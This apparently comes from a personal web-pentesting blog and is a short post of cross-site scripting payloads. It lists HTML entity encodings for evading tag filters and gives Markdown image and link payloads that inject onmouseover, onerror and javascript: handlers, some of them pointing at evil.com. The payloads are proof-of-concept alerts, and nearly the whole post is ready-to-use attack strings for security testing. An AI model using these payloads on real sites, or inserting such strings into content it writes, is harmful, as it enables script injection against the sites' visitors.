---
layout: post
title: "XSS Payload Expansion"
date: 2024-01-01 08:30:00 +0700
categories: "Web-Pentesting"
---

## Alternative Tag Encoding

| Tag | Hex Code | Decimal |
| :-: | :------: | :-----: |
|  <  | `&#x3c;` | `&#60;` |
|  >  | `&#x3e;` | `&#62;` |
|  "  | `&#x22;` | `&#34;` |
|  =  | `&#x3d;` | `&#61;` |
|  (  | `&#x28;` | `&#40;` |
|  )  | `&#x29;` | `&#41;` |
|  ;  | `&#x3b;` | `&#59;` |

Payload to use `<h1>` => `&#x3c;h1&#x3e;` or `<script>` => `&#60;script&#62;`.

-----

<br/>

## XSS on Markdown Format

Image
```
![" onmouseover="alert(1);](https://evil.com/random.png)
![TEST](x"/onerror="alert`/Oops/`)
```

URL / Anchor href
```
[TEST](javascript:alert(document.domain))
[" onmouseover="alert(1);](javascript:alert(document.domain))
<https://evil.com" onmouseover="alert(1)>
``` 